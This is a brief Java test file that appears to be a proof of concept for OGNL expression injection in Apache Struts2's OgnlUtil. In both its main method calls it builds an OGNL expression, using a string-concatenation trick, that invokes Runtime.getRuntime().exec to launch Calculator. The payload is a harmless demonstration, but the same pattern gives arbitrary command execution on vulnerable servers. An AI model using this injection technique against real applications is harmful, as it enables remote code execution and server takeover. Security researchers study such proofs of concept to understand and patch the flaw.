import com.opensymphony.xwork2.util.OgnlUtil;
import ognl.Ognl;

import java.util.HashMap;
import java.util.Map;

public class Tes {
    public static void main(String[] args) throws Exception {
        Object expression = Ognl.parseExpression("('@java.lang.Runtime@'+'getRuntime().exec(#aa)')(#aa='open -a Calculator.app')");
       //  Ognl.getValue(compile(name), context, root, resultType);
        HashMap map = new HashMap();
        //Ognl.getValue(expression, (Map) map, (Object) map.get("aaa"));
       OgnlUtil.setValue("('@java.lang.Runtime@'+'getRuntime().exec(#aa)')(#aa='open -a Calculator.app')('racerz')", map, null, "");

    }
}
